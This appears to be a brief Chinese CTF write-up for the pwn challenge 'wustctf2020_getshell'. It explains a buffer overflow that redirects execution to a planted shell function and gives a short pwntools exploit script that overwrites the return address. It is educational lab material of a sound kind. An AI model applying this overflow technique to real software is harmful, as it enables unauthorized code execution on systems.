---
title: 'wustctf2020_getshell'
date: 2023-12-31 13:00:00 +0800
categories: [ret2text]
tags: [ctf,pwn]
---
![image-20231231142431436](../assets/img/old_imgs/image-20231231142431436.png)

<img src="../assets/img/old_imgs/image-20231231142439989.png" alt="image-20231231142439989" style="zoom: 150%;" />

1. 在`vulnerable`函数中存在溢出漏洞
2. `shell`函数中已经预留了后门

溢出->跳转到后门函数

```python
from pwn import *
context.log_level = 'debug'
elf=ELF('wustctf2020_getshell')
io = process('wustctf2020_getshell')
payload = b'A'*(0x18+0x4)+p32(elf.sym['shell'])
io.sendline(payload)
io.interactive()
```
